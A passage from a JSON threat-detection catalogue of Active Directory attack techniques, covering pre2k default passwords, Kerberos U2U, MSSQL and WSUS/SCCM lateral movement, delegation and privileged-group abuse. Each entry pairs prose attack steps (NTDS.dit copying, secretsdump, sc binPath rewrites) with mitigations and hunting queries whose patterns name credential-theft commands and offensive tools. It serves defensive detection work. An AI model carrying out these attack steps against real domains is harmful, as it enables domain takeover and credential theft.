sqldst"}]},{"name":"Pre-created / Stale Computer Account Takeover","aka":"default password = lowercase computer name, pre2k, unjoined machine account","phase":"privesc","group":"Delegation","mitre":"T1078.002","cve":"","sev":"High","summary":"Technique that abuses the fact that a pre-created but unjoined computer account has a default password equal to the lowercase computer name, taking over the account to enable RBCD etc.","how":"Enumerate computer objects with PASSWD_NOTREQD or unjoined-state flags in userAccountControl and attempt authentication with password = lowercase computer name (e.g., WKSTA01$ has password wksta01). On success, take over the machine account and use it to set Shadow Credentials/RBCD/delegation for domain lateral movement and escalation. Especially likely with stale accounts in old domains.","tools":"pre2k, NetExec, impacket (changepasswd/getTGT), Rubeus","detect":"Inventory computer accounts with PASSWD_NOTREQD or long logon inactivity, and detect authentication success with default-equivalent passwords (4624/4768). Monitor authentication attempts using a password identical to the machine account name.","events":"4768/4624 (マシンアカウント認証), 4741/4742 (作成/UAC変更), 陳腐化アカウント棚卸し","mitigate":"Have an admin pre-create computer accounts at join time and join immediately, and delete/disable PASSWD_NOTREQD or long-unused accounts. Avoid delegation of join and run pre2k scans regularly.","triage":"In AD inventory computer accounts with PASSWD_NOTREQD or stale lastLogonTimestamp, and detect 4768/4624 auth success where the password equals the lowercase computer name. It is malicious if one source makes sequential auth attempts against many machine accounts (pre2k/NetExec pattern) and, right after takeover, 4741/4742 (UAC change) or Shadow Credentials/RBCD configuration follows. It is benign for a new join during legitimate OSD/imaging or a first auth of an MDT/SCCM pre-staged account. The decider is brute-style multi-account attempts landing on a default password.","hunt":[{"plat":"Sentinel","t":"RC4(0x17) TGT request (4768) for a computer account, surfacing pre2k default-password takeover. Machine account TGT via RC4 = black / AES(0x12) normal = white","q":"SecurityEvent\n| where TimeGenerated > ago(1d)\n| where EventID == 4768\n| where TargetUserName endswith \"$\"\n| where TicketEncryptionType == \"0x17\"           // RC4 TGT for a machine account is abnormal (default/pre2k pw)\n| summarize count(), srcs=make_set(IpAddress,15) by TargetUserName, Computer, bin(TimeGenerated, 1h)"},{"plat":"MDI","t":"Correlate machine-account logon success with IdentityInfo to flag stale/pre-created accounts. Sudden auth from a dormant machine acct = black / active machine = white","q":"IdentityLogonEvents\n| where Timestamp > ago(1d)\n| where ActionType == \"LogonSuccess\" and AccountName endswith \"$\"\n| join kind=inner (IdentityInfo | where IsAccountEnabled == true | project AccountName, AccountSID, JobTitle, Department) on AccountName\n| summarize count(), devs=make_set(DeviceName,10) by AccountName, IPAddress, bin(Timestamp, 1h)"}],"huntcs":[{"plat":"LogScale","t":"Machine account ($) doing Type3 auth from a host that isn't itself=default-password takeover=black / self-host machine auth=white","q":"#event_simpleName=UserLogon\n| LogonType=3\n| UserName=/\\$$/\n| groupBy([UserName, ComputerName, RemoteAddressIP4], function=count(as=hits))\n| sort(hits, order=desc)"},{"plat":"Identity Protection","t":"4768 success with computername-as-password (pre2k) and PASSWD_NOTREQD inventory is DC/IDP-visible=black","q":"// Falcon Identity Protection detection: stale/pre-created computer account authenticating with default (lowercase name) password — DC-only Kerberos 4768"}]},{"name":"Kerberos U2U (User-to-User) Abuse","aka":"User-to-User TGS, S4U2self+U2U, Sapphire Ticket foundation","phase":"credaccess","group":"Kerberos","mitre":"T1558","cve":"","sev":"Medium","summary":"User-to-User authentication that obtains a TGS using a user TGT as the key without requiring an SPN. An independent technique that underpins Sapphire Ticket creation and privileged ticket acquisition.","how":"In U2U, the service ticket is encrypted with the counterpart user's TGT session key rather than the service's long-term key, so even against a user with no registered SPN, combining S4U2self+U2U yields a TGS containing a privileged user's PAC. This is the basis for Sapphire Ticket (reusing a legitimate privileged user's PAC) and for getcredentials' U2U usage.","tools":"Rubeus (asktgs /u2u, tgssub), impacket (getST -u2u), mimikatz","detect":"Detect Kerberos ticket requests indicating U2U (the ENC-TKT-IN-SKEY flag in the TGS-REQ) and anomalous ticket acquisition combining S4U2self and U2U. Monitor for anomalous issuance of a TGS containing a privileged user PAC and for Sapphire Ticket indicators.","events":"4769 (TGS要求, U2Uフラグ), 4768, PAC検証関連","mitigate":"Enforce AES encryption and deploy Kerberos armoring (FAST), and place privileged accounts in Protected Users. Operate periodic KRBTGT rotation and anomalous ticket detection (PAC inconsistency).","triage":"On the DC pull 4769 and find TGS-REQs with the ENC-TKT-IN-SKEY (U2U) flag combined with S4U2self to obtain a TGS carrying a privileged user's PAC for an SPN-less normal user. It is malicious if one account chains S4U2self+U2U in a short window and reuses a legitimate privileged user's PAC (Sapphire Ticket indicator) across 4769s. It is benign for steady ENC-TKT-IN-SKEY from legitimate KCD/claims apps or services that use U2U legitimately. The decider is targeting an SPN-less user while a privileged PAC is injected.","hunt":[{"plat":"Sentinel","t":"4769 where ServiceName points to another user account (not $-suffixed) = User-to-User TGS. User-targeted TGS via RC4 = black / normal SPN/computer service TGS = white","q":"SecurityEvent\n| where TimeGenerated > ago(1d)\n| where EventID == 4769\n| where ServiceName !endswith \"$\" and ServiceName !has \"krbtgt\"\n| where ServiceName != TargetUserName            // requesting a ticket to a different USER = U2U\n| where TicketEncryptionType == \"0x17\"\n| summarize count(), targets=make_set(ServiceName,15) by TargetUserName, Computer, bin(TimeGenerated, 10m)\n| where count_ > 0"}],"huntcs":[{"plat":"LogScale","t":"Rubeus combining u2u/s4u for TGS=U2U abuse behind Sapphire tickets=black / normal Kerberos=white","q":"#event_simpleName=ProcessRollup2\n| CommandLine=/Rubeus.*(u2u|s4u|tgssub|asktgs).*/i\n| groupBy([ComputerName, UserName, FileName, CommandLine], function=count(as=hits))\n| sort(hits, order=desc)"},{"plat":"Identity Protection","t":"TGS-REQ ENC-TKT-IN-SKEY (U2U) flag and privileged-PAC anomalies are DC 4769-only=detect via IDP=black","q":"// Falcon Identity Protection detection: Kerberos U2U / S4U2self+U2U ticket request (ENC-TKT-IN-SKEY) — DC-only 4769, no attacker-host footprint"}]},{"name":"MSSQL Lateral Movement (Linked Servers / Impersonation)","aka":"linked server chaining, xp_cmdshell, TRUSTWORTHY DB, EXECUTE AS","phase":"lateral","group":"Management Infra Abuse (SCCM/WSUS/MSSQL)","mitre":"T1210","cve":"","sev":"High","summary":"A core set of lateral movement and privilege escalation techniques: traversal via linked server chaining, DB impersonation via EXECUTE AS/TRUSTWORTHY, and OS command execution via xp_cmdshell.","how":"After accessing MSSQL with a low-privilege login, traverse to other instances by following linked servers (OPENQUERY chaining) and execute as sysadmin remotely. Escalate to sysadmin via db_owner of a TRUSTWORTHY ON DB with EXECUTE AS OWNER, or impersonate with EXECUTE AS LOGIN, ultimately running OS commands under the SQL service account with xp_cmdshell/OLE Automation/sp_OACreate or a CLR assembly.","tools":"PowerUpSQL, mssqlclient.py(impacket), SQLRecon, Chisel/xp_cmdshell","detect":"Detect enabling/execution of xp_cmdshell, cross-server queries via linked servers, and use of EXECUTE AS/IMPERSONATE via SQL auditing. Monitor for unexpected child processes (cmd.exe/powershell.exe) from the SQL service account via EDR.","events":"SQL Server監査 (xp_cmdshell実行, IMPERSONATE), Sysmon 1 (sqlservr.exe子プロセス), 4688","mitigate":"Disable xp_cmdshell/OLE Automation and enable CLR strict security. Map linked server remote logins to least privilege, set TRUSTWORTHY OFF, and make the SQL service account a non-privileged gMSA. Restrict SQL-to-SQL communication at the network level.","triage":"In SQL Server audit detect xp_cmdshell enablement (sp_configure)/execution, cross-server OPENQUERY via linked servers, and EXECUTE AS/IMPERSONATE, then correlate sqlservr.exe child processes (cmd.exe/powershell.exe) in EDR/Sysmon EID1 and 4688. It is malicious if a low-priv login escalates to sysadmin via linked-server chaining or TRUSTWORTHY and runs OS commands under the SQL service account. It is benign for legitimate jobs/ETL/linked-server integration or planned DBA xp_cmdshell use with known job names, windows, and sources. The decider is an interactive shell spawned by sqlservr.exe.","hunt":[{"plat":"MDE","t":"sqlservr.exe spawning cmd/powershell child processes (xp_cmdshell). Shell launched from the SQL service = black / SQL engine running alone = white","q":"DeviceProcessEvents\n| where Timestamp > ago(1d)\n| where InitiatingProcessFileName =~ \"sqlservr.exe\"\n| where FileName in~ (\"cmd.exe\",\"powershell.exe\",\"pwsh.exe\",\"wscript.exe\",\"cscript.exe\",\"bash.exe\")\n| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine, InitiatingProcessCommandLine"},{"plat":"MDE","t":"Lateral outbound to 1433 from the SQL service indicating linked-server chaining. SQL reaching many other SQL hosts = black / known replication peer = white","q":"DeviceNetworkEvents\n| where Timestamp > ago(1d)\n| where RemotePort == 1433\n| where InitiatingProcessFileName =~ \"sqlservr.exe\"\n| summarize peers=dcount(RemoteIP), ips=make_set(RemoteIP,15) by DeviceName, InitiatingProcessAccountName, bin(Timestamp, 30m)\n| where peers > 2"}],"huntcs":[{"plat":"Event Search","t":"sqlservr.exe spawning cmd/powershell=xp_cmdshell lateral movement=black / SQL's legit children=white","q":"event_simpleName=ProcessRollup2 ParentBaseFileName=\"sqlservr.exe\"\n| where FileName IN (\"cmd.exe\",\"powershell.exe\",\"pwsh.exe\",\"wscript.exe\",\"cscript.exe\",\"bitsadmin.exe\")\n| stats count by ComputerName, UserName, FileName, CommandLine"},{"plat":"LogScale","t":"sqlservr.exe connecting out to many remote 1433s=linked-server chaining=black / a single legit replica link=white","q":"#event_simpleName=NetworkConnectIP4\n| ContextBaseFileName=\"sqlservr.exe\"\n| RemotePort=1433\n| groupBy([ComputerName], function=[count(as=conns), count(field=RemoteAddressIP4, as=linked, distinct=true)])\n| linked > 2\n| sort(linked, order=desc)"}]},{"name":"WSUS Abuse (Malicious Update Distribution)","aka":"SharpWSUS, WSUSpendu, malicious update distribution","phase":"lateral","group":"Management Infra Abuse (SCCM/WSUS/MSSQL)","mitre":"T1072","cve":"","sev":"High","summary":"Technique that seizes a WSUS server and distributes/executes a signed binary (e.g., PsExec) as an approved update to downstream endpoints for lateral movement.","how":"After accessing the WSUS server (or its SUSDB), use SharpWSUS/WSUSpendu to register and approve a Microsoft-signed binary (e.g., psexec.exe) as a fake update with command-line arguments, distributing it to target computers. Abuse configurations where WSUS delivers over HTTP (signature verification covers only the signer) and injectable approvals to reach SYSTEM execution on clients.","tools":"SharpWSUS, WSUSpendu, PyWSUS(HTTP中間者), PsExec(ペイロード)","detect":"Detect direct writes to SUSDB, unexpected manually approved updates, and updates whose distributed binary carries command-line arguments via WSUS/event logs. On the client side, monitor for psexec etc. spawned by wuauclt/TiWorker and anomalous processes running as SYSTEM.","events":"WSUSイベントログ, SUSDB監査, Sysmon 1 (wuauclt→psexec等), 4688","mitigate":"Deliver WSUS over HTTPS+TLS and protect the WSUS server as a Tier0 asset. Restrict access to SUSDB, enforce separation of duties for update approval, and minimize WSUS server administrators.","triage":"On the WSUS server detect direct SUSDB writes, unexpected manually-approved updates, or a fake update distributing a Microsoft-signed binary (e.g., psexec.exe) with command-line arguments via WSUS/event logs. It is malicious if clients show, via Sysmon EID1/4688, psexec.exe spawned from wuauclt.exe/TiWorker.exe running as SYSTEM tied to the same update ID. It is benign for a legitimate patch-approval workflow (known admin, change ticket, patch Tuesday) with no argument-bearing executable distribution. The decider is a signed binary carrying command-line arguments in an update.","hunt":[{"plat":"MDE","t":"WU host process spawning shell/PsExec = black / normal TiWorker servicing only = white","q":"DeviceProcessEvents\n| where Timestamp > ago(1d)\n| where InitiatingProcessFileName in~ (\"wuauclt.exe\",\"TiWorker.exe\",\"MoUsoCoreWorker.exe\",\"UsoClient.exe\")\n| where FileName in~ (\"cmd.exe\",\"powershell.exe\",\"pwsh.exe\",\"psexec.exe\",\"psexesvc.exe\",\"rundll32.exe\",\"wscript.exe\",\"cscript.exe\",\"mshta.exe\")\n| project Timestamp, DeviceName, AccountName, InitiatingProcessFileName, FileName, ProcessCommandLine\n| sort by Timestamp desc"}],"huntcs":[{"plat":"Event Search","t":"cmd/psexec spawned under wuauclt/TiWorker as SYSTEM = malicious / only legit WU children = benign","q":"event_simpleName=ProcessRollup2 (ParentBaseFileName=wuauclt.exe OR ParentBaseFileName=TiWorker.exe OR ParentBaseFileName=UsoClient.exe)\nFileName IN (cmd.exe, powershell.exe, pwsh.exe, psexec.exe, PsExec64.exe, rundll32.exe, mshta.exe)\n| stats count values(CommandLine) as cmds by ComputerName, ParentBaseFileName, FileName, UserName, IntegrityLevel\n| sort - count"},{"plat":"LogScale","t":"SharpWSUS/WSUSpendu tooling executed on WSUS host = malicious / admin GUI ops = benign","q":"#event_simpleName=ProcessRollup2\n| CommandLine=/SharpWSUS|wsuspendu|approve\\s+.*\\/updateid|create\\s+.*\\/payload/i\n| groupBy([ComputerName, UserName, FileName], function=count())\n| sort(count, order=desc)"}]},{"name":"SCCM Application/Script Deployment Lateral Movement","aka":"SharpSCCM exec, collection deployment abuse","phase":"lateral","group":"Management Infra Abuse (SCCM/WSUS/MSSQL)","mitre":"T1072","cve":"","sev":"High","summary":"Lateral movement that abuses SCCM's legitimate application/script deployment features, using full admin rights to execute a SYSTEM-privileged payload on endpoints in a collection.","how":"After gaining SCCM Full Administrator or equivalent rights, use SharpSCCM or the AdminService to create an application deployment or immediate CMScripts execution against devices/collections, making the target's SCCM client (ccmexec, SYSTEM) run the payload. Because it uses legitimate management channels, it blends in with normal operations and is hard to spot via EDR.","tools":"SharpSCCM (invoke), sccmhunter (exec), AdminService API, CMPivot/Scripts","detect":"Detect creation of application deployments/script executions by non-console/unauthorized operators, and short-lived deployments with immediate rollout, via SCCM auditing/AdminService logs. On clients, monitor for anomalous ccmexec→cmd/powershell child processes.","events":"SCCM監査状態メッセージ, AdminServiceログ, Sysmon 1 (ccmexec.exe子プロセス), 4688","mitigate":"Minimize SCCM RBAC (roles) and tightly control Full Administrator. Enable script execution approval (approver separation), protect the site server/SMS provider as Tier0, and alert on deployment creation via auditing.","triage":"In SCCM audit status messages/AdminService logs detect app deployments or immediate CMScript execution created by an unapproved operator or outside the console (SharpSCCM/AdminService API), plus short-lived deployments with immediate rollout. It is malicious if clients show ccmexec.exe children (cmd.exe/powershell.exe) running as SYSTEM in Sysmon EID1/4688, correlated to that deployment's creator and time. It is benign for legitimate package distribution/CMPivot ops by a known admin with change control to expected collections. The deciders are creator identity, deployment ephemerality, and a ccmexec-spawned shell.","hunt":[{"plat":"MDE","t":"ccmexec.exe spawning cmd/powershell as SYSTEM = deployment abuse black / routine inventory = white","q":"DeviceProcessEvents\n| where Timestamp > ago(1d)\n| where InitiatingProcessFileName =~ \"ccmexec.exe\"\n| where FileName in~ (\"cmd.exe\",\"powershell.exe\",\"pwsh.exe\",\"wscript.exe\",\"cscript.exe\",\"mshta.exe\",\"rundll32.exe\",\"regsvr32.exe\")\n| where ProcessIntegrityLevel in (\"System\",\"High\")\n| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine, ProcessIntegrityLevel\n| sort by Timestamp desc"}],"huntcs":[{"plat":"Event Search","t":"CcmExec.exe spawning cmd/powershell/script hosts = malicious / normal ccmexec children = benign","q":"event_simpleName=ProcessRollup2 ParentBaseFileName=CcmExec.exe\nFileName IN (cmd.exe, powershell.exe, pwsh.exe, cscript.exe, wscript.exe, mshta.exe, rundll32.exe)\n| stats count values(CommandLine) as cmds dc(ComputerName) as hosts by FileName, UserName\n| sort - count"},{"plat":"LogScale","t":"SharpSCCM exec / CMPivot abuse commandline on operator host = malicious / normal console deploy = benign","q":"#event_simpleName=ProcessRollup2\n| CommandLine=/SharpSCCM|invoke-cmpivot|\\bexec\\b.*(-p|--path)|get\\s+naa|administration\\s*service/i\n| groupBy([ComputerName, UserName, FileName], function=count())\n| sort(count, order=desc)"}]},{"name":"PrimaryGroupID Tampering","aka":"primaryGroupID rewrite, stealth group membership","phase":"privesc","group":"ACL / Object Permissions","mitre":"T1098","cve":"","sev":"High","summary":"Stealth privilege escalation that rewrites a target user's primaryGroupID to 512/519/518 etc. to gain effective membership in a privileged group without touching the group's member attribute.","how":"When you have write rights (GenericWrite etc.) over a target user object, rewrite the primaryGroupID attribute to the RID of a domain global privileged group such as Domain Admins (512) or Enterprise Admins (519) (primaryGroupID can only store a domain-relative RID, so domain-local groups such as 544=BUILTIN Administrators cannot be specified). Because primaryGroup-based membership does not appear in the group's member attribute, it evades ordinary group membership audits while effectively conferring the privileged group's rights.","tools":"PowerView (Set-DomainObject), ldapmodify, ADSI/Set-ADUser","detect":"Detect primaryGroupID changes (5136) on users/computers and immediately alert on changes to privileged RIDs such as 512/519/518/516 (BUILTIN domain-local RIDs such as 544 cannot be a primaryGroupID value). Inventory the effective members of privileged groups including primaryGroupID.","events":"5136 (primaryGroupID属性変更), 4738 (user account changed), 4662","mitigate":"Minimize write ACLs on privileged objects and remove excessive delegation such as GenericWrite. Monitor primaryGroupID changes in SIEM, verify AdminSDHolder-protected objects, and run periodic effective-member audits.","triage":"On the DC pull 5136 for primaryGroupID changes on user/computer objects and immediately alert when the value is rewritten to a privileged RID like 512 (Domain Admins)/519 (Enterprise Admins)/518 (Schema Admins), checking 4738 and the modifier's privileges. It is malicious if a non-admin (e.g., a GenericWrite holder) changes a target's primaryGroupID to a privileged RID, yielding effective escalation invisible to group.member auditing. It is benign for legitimate account migration/OU restructuring or expected IDM attribute sync by an approved admin under change control. The deciders are whether the new RID is a privileged group and whether the actor is a non-admin.","hunt":[{"plat":"Sentinel","t":"primaryGroupID changed to a privileged RID (512/519/518/544) via 5136 = stealth escalation black / value 513 = white","q":"SecurityEvent\n| where TimeGenerated > ago(1d)\n| where EventID == 5136\n| where Properties has \"primaryGroupID\"\n| where OperationType == \"%%14674\"\n| where Properties has_any (\"512\",\"519\",\"518\",\"516\",\"520\",\"521\",\"544\")\n| project TimeGenerated, Computer, SubjectUserName, ObjectName, ObjectType, Properties\n| sort by TimeGenerated desc"}],"huntcs":[{"plat":"Event Search","t":"primaryGroupID rewrite command on host (Set-ADUser/PowerView) = malicious / sanctioned attr mgmt = benign","q":"event_simpleName=ProcessRollup2 CommandLine=\"*primaryGroupID*\"\n| stats count values(CommandLine) as cmds by ComputerName, UserName, FileName, ParentBaseFileName\n| sort - count"},{"plat":"Identity Protection","t":"DC 5136 primaryGroupID -> privileged RID (512/519/518/544) is DC-only; correlate host tool via PR2","q":"// Falcon Identity Protection detection: privileged group membership change via primaryGroupID (DC 5136 / 4738). No attacker-host EDR footprint; pivot to ProcessRollup2 primaryGroupID commandline above."}]},{"name":"userAccountControl Write Abuse","aka":"granting TRUSTED_FOR_DELEGATION, PASSWD_NOTREQD, DONT_EXPIRE_PASSWD","phase":"privesc","group":"ACL / Object Permissions","mitre":"T1098","cve":"","sev":"High","summary":"Privilege-escalation via writes to a target's userAccountControl, abusing UAC bits such as unconstrained delegation (TRUSTED_FOR_DELEGATION) or removing the password requirement (excludes DONT_REQ_PREAUTH).","how":"With write access alone: PASSWD_NOTREQD (0x20) allows password-less authentication, DONT_REQ_PREAUTH enables AS-REP Roasting, and DONT_EXPIRE_PASSWD provides persistence. Note: newly enabling unconstrained delegation via TRUSTED_FOR_DELEGATION (0x80000) requires SeEnableDelegationPrivilege on the DC (normally DA-equivalent only), so generic write access alone is insufficient. Each UAC bit enables varied abuse.","tools":"PowerView (Set-DomainObject useraccountcontrol), bloodyAD, ldapmodify, Rubeus(委任悪用)","detect":"Detect userAccountControl changes (5136/4738/4742), especially setting the TRUSTED_FOR_DELEGATION bit or PASSWD_NOTREQD, in real time. Alert on unconstrained delegation granted to non-DC objects as high risk.","events":"4738/4742 (UAC変更), 5136 (userAccountControl属性), 4662","mitigate":"Minimize write ACLs on objects and monitor/forbid newly created unconstrained delegation. Place privileged/sensitive accounts in Protected Users and set \"Account is sensitive and cannot be delegated\" (NOT_DELEGATED); alert on UAC audit changes.","triage":"On the DC pull 4738/4742 userAccountControl changes (and 5136 for the attribute) and diff old→new value for PASSWD_NOTREQD(0x20)/DONT_REQ_PREAUTH/DONT_EXPIRE_PASSWD bit sets, checking whether SubjectUserName is a legitimate admin for that target. It is black if DONT_REQ_PREAUTH is set then followed by DC 4768 (PreAuth Type=0/RC4) AS-REP for the same object, or PASSWD_NOTREQD set then a passwordless 4624 LogonType3, with the change sourced from an unmanaged host/PowerView/bloodyAD. It is benign if the change comes from an IDM/provisioning or HR system, within business hours with a change ticket, or is a known service-account DONT_EXPIRE_PASSWD standing config. TRUSTED_FOR_DELEGATION granted to a non-DC object requires SeEnableDelegationPrivilege, so its appearance from a generic write edge is highly suspicious and priority-triaged.","hunt":[{"plat":"Sentinel","t":"UAC change (4738/4742) granting TRUSTED_FOR_DELEGATION/PASSWD_NOTREQD = black / routine account edits = white","q":"SecurityEvent\n| where TimeGenerated > ago(1d)\n| where EventID in (4738, 4742)\n| where Properties has_any (\"TRUSTED_FOR_DELEGATION\",\"0x80000\",\"524288\",\"PASSWD_NOTREQD\",\"0x20\",\"DONT_EXPIRE_PASSWD\")\n| project TimeGenerated, Computer, EventID, SubjectUserName, TargetUserName, TargetDomainName, Properties\n| sort by TimeGenerated desc"},{"plat":"Sentinel","t":"5136 rewrite of userAccountControl to a value carrying the unconstrained-delegation bit = black; non-DC objects highest risk","q":"SecurityEvent\n| where TimeGenerated > ago(1d)\n| where EventID == 5136\n| where Properties has \"userAccountControl\"\n| where OperationType == \"%%14674\"\n| where Properties has_any (\"0x80000\",\"524288\",\"0x1000000\")\n| project TimeGenerated, Computer, SubjectUserName, ObjectName, ObjectType, Properties\n| sort by TimeGenerated desc"}],"huntcs":[{"plat":"Event Search","t":"TrustedForDelegation grant / PASSWD_NOTREQD set commands on host = malicious / sanctioned delegation = benign","q":"event_simpleName=ProcessRollup2 (CommandLine=\"*TrustedForDelegation*\" OR CommandLine=\"*Set-ADAccountControl*\" OR CommandLine=\"*PASSWD_NOTREQD*\" OR CommandLine=\"*DONT_EXPIRE_PASSWD*\" OR CommandLine=\"*userAccountControl*\")\n| stats count values(CommandLine) as cmds by ComputerName, UserName, FileName, ParentBaseFileName\n| sort - count"},{"plat":"Identity Protection","t":"UAC bit change (unconstrained deleg / PASSWD_NOTREQD) is DC-only via IdP; correlate host cmdline above","q":"// Falcon Identity Protection detection: userAccountControl / delegation flag modification (DC 5136/4738/4742). Falcon EDR has no DC-side view; pivot to attacker-host ProcessRollup2 query above."}]},{"name":"msDS-AllowedToDelegateTo Write (Constrained Delegation)","aka":"new KCD, granting protocol transition, S4U2proxy abuse","phase":"privesc","group":"Delegation","mitre":"T1098","cve":"","sev":"High","summary":"A write edge that adds a constrained delegation (KCD) path via the target's msDS-AllowedToDelegateTo attribute, gaining arbitrary-user impersonation through S4U with protocol transition.","how":"With write access to the target account, add a target SPN (e.g. cifs/dc) to msDS-AllowedToDelegateTo and set TRUSTED_TO_AUTH_FOR_DELEGATION (protocol transition) in userAccountControl (note: setting this bit requires SeEnableDelegationPrivilege, normally DA-equivalent only; the write edge alone yields Kerberos-only constrained delegation without protocol transition). From a controlled account, use S4U2self+S4U2proxy to obtain a service ticket impersonating any user (including DA) and access the target service.","tools":"PowerView (Set-DomainObject), Rubeus (s4u), impacket (getST -impersonate), bloodyAD","detect":"Detect changes to the msDS-AllowedToDelegateTo attribute (5136) and setting of the TRUSTED_TO_AUTH_FOR_DELEGATION bit. Monitor abnormal S4U2self/S4U2proxy ticket requests (4769 delegation flags, impersonated-user/service combinations).","events":"5136 (msDS-AllowedToDelegateTo変更), 4738/4742, 4769 (S4U TGS)","mitigate":"Minimize write ACLs on delegation attributes and alert on new KCD configuration. Place sensitive accounts in Protected Users/mark them non-delegatable, inventory and minimize delegation-target SPNs, and deploy AES and FAST.","triage":"On the DC pull 5136 for value additions to msDS-AllowedToDelegateTo (e.g. cifs/dc, host/dc) and correlate 4738/4742 for a TRUSTED_TO_AUTH_FOR_DELEGATION bit set. It is black if, right after the attribute change and for the same account, DC 4769 shows an S4U2self/S4U2proxy chain whose Transited Services field carries an impersonated privileged user (e.g. DA), sourced from an unmanaged host (Rubeus s4u/impacket getST). It is benign for a web-front/DB middleware service account that legitimately uses Kerberos constrained delegation, where the change was ticketed, the SPNs are operationally sane, and the delegation is a standing config. Arbitrary-user impersonation via S4U on a Kerberos-only (no protocol transition) delegation is a strong anomaly.","hunt":[{"plat":"Sentinel","t":"value added to msDS-AllowedToDelegateTo (5136) = new constrained-delegation black / no change on known services = white","q":"SecurityEvent\n| where TimeGenerated > ago(1d)\n| where EventID == 5136\n| where Properties has \"msDS-AllowedToDelegateTo\"\n| where OperationType == \"%%14674\"\n| project TimeGenerated, Computer, SubjectUserName, ObjectName, ObjectType, Properties\n| sort by TimeGenerated desc"},{"plat":"Sentinel","t":"4769 S4U TGS from one service impersonating many distinct users with delegation options = black / single user = white","q":"SecurityEvent\n| where TimeGenerated > ago(1d)\n| where EventID == 4769\n| where ServiceName !endswith \"$\"\n| summarize ImpersonatedUsers = dcount(TargetUserName), Users = make_set(TargetUserName, 20) by ServiceName, Computer, bin(TimeGenerated, 1h)\n| where ImpersonatedUsers > 5\n| sort by ImpersonatedUsers desc"}],"huntcs":[{"plat":"Event Search","t":"Write to msDS-AllowedToDelegateTo / PrincipalsAllowedToDelegateTo on host = malicious / sanctioned KCD = benign","q":"event_simpleName=ProcessRollup2 (CommandLine=\"*msDS-AllowedToDelegateTo*\" OR CommandLine=\"*PrincipalsAllowedToDelegateTo*\" OR CommandLine=\"*Set-ADUser*DelegateTo*\" OR CommandLine=\"*rbcd*\")\n| stats count values(CommandLine) as cmds by ComputerName, UserName, FileName, ParentBaseFileName\n| sort - count"},{"plat":"Identity Protection","t":"msDS-AllowedToDelegateTo change + anomalous S4U2proxy (4769) is DC-only via IdP; correlate host cmd above","q":"// Falcon Identity Protection detection: constrained delegation (msDS-AllowedToDelegateTo) write & S4U2proxy abuse (DC 5136/4769). No attacker-host EDR event; use ProcessRollup2 query above for the tooling footprint."}]},{"name":"Backup Operators Abuse","aka":"Backup Operators, lawful SeBackupPrivilege abuse","phase":"privesc","group":"Privileged Group Abuse","mitre":"T1003.003, T1078.002","cve":"","sev":"Critical","summary":"Built-in group abuse using Backup Operators' SeBackupPrivilege/SeRestorePrivilege legitimately to obtain the DC's NTDS.dit and registry, compromising the entire domain.","how":"Backup Operators members log on to a DC over the network and use SeBackupPrivilege to copy NTDS.dit and the SYSTEM hive (diskshadow/esentutl/robocopy /b), or save SAM/SECURITY via remote registry. From the obtained hives, secretsdump extracts all domain hashes (including krbtgt), amounting to a DCSync-equivalent domain compromise. SeRestorePrivilege also enables escalation via binary replacement.","tools":"diskshadow, esentutl, robocopy /b, reg save, impacket-secretsdump, SeBackupPrivilegeCmdLets","detect":"Detect Backup Operators membership changes (4732), interactive/network logons to DCs, and access to NTDS.dit. Monitor SeBackupPrivilege use by non-backup products and diskshadow launches.","events":"4732 (グループ追加), 4672 (特権割当), 4663 (ntds.dit), Sysmon 1 (diskshadow/esentutl)","mitigate":"Treat Backup Operators as Tier0 and remove/minimize members; perform backups with dedicated, limited privileges. Separate DC logon rights, audit NTDS.dit access, and verify AdminSDHolder protection.","triage":"On the DC pull 4732 (add to Backup Operators), then timeline the added account's DC 4624 (LogonType3 network / 2 interactive) plus 4672 (SeBackupPrivilege/SeRestorePrivilege), and correlate 4663 access to ntds.dit with Sysmon EID1 for diskshadow.exe/esentutl.exe/robocopy /b/reg save. It is black if a principal that is NOT the known backup-product service account/host uses SeBackupPrivilege to copy NTDS.dit or SAM/SECURITY hives, followed by secretsdump-like activity or exfiltration of those hives. It is benign when an authorized backup job runs on schedule from the dedicated backup server with known binaries and writes to the legitimate backup target. A first-ever DC backup operation by an account only recently added to Backup Operators is top priority.","hunt":[{"plat":"Sentinel","t":"member added to Backup Operators (RID-551) via 4732 = black / no approved backup-admin change = white","q":"SecurityEvent\n| where TimeGenerated > ago(1d)\n| where EventID in (4732, 4728, 4756)\n| where TargetSid endswith \"-551\" or TargetUserName == \"Backup Operators\"\n| project TimeGenerated, Computer, SubjectUserName, MemberName, MemberSid, TargetUserName\n| sort by TimeGenerated desc"},{"plat":"MDE","t":"diskshadow/esentutl performing ntds shadow/copy operations = SeBackup abuse black / from backup product = white","q":"DeviceProcessEvents\n| where Timestamp > ago(1d)\n| where FileName in~ (\"diskshadow.exe\",\"esentutl.exe\",\"wbadmin.exe\",\"vssadmin.exe\",\"ntdsutil.exe\")\n| where ProcessCommandLine has_any (\"ntds\",\"expose\",\"create\",\"/vss\",\"copy\",\"ifm\")\n| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine, InitiatingProcessFileName\n| sort by Timestamp desc"}],"huntcs":[{"plat":"Event Search","t":"diskshadow/esentutl/ntdsutil or ntds.dit access on DC = malicious / real backup-product parent = benign","q":"event_simpleName=ProcessRollup2 (FileName IN (diskshadow.exe, esentutl.exe, ntdsutil.exe, wbadmin.exe) OR CommandLine=\"*ntds.dit*\" OR CommandLine=\"*create full*\" OR CommandLine=\"*/y /vss*\")\n| stats count values(CommandLine) as cmds values(ParentBaseFileName) as parents by ComputerName, UserName, FileName\n| sort - count"},{"plat":"LogScale","t":"SeBackupPrivilege-driven copy of SAM/SYSTEM/NTDS on DC = malicious / scheduled backup job = benign","q":"#event_simpleName=ProcessRollup2\n| CommandLine=/(reg\\s+save.*(sam|system|security))|robocopy.*ntds|copy.*ntds\\.dit/i\n| groupBy([ComputerName, UserName, FileName, ParentBaseFileName], function=count())\n| sort(count, order=desc)"}]},{"name":"Server Operators Abuse","aka":"Server Operators, sc config service tampering","phase":"privesc","group":"Privileged Group Abuse","mitre":"T1543.003","cve":"","sev":"Critical","summary":"Built-in group abuse where Server Operators modify a DC service configuration (binPath) to run arbitrary commands as SYSTEM and take over the domain.","how":"Because Server Operators can manage services on a DC, use sc config <service> binPath= to rewrite an existing service's (e.g. a stopped service) binary path to an attacker command, then restart the service to run as LocalSystem. Obtaining SYSTEM on a DC leads directly to NTDS extraction and krbtgt theft. Members also hold SeBackupPrivilege and similar.","tools":"sc.exe (config/start), 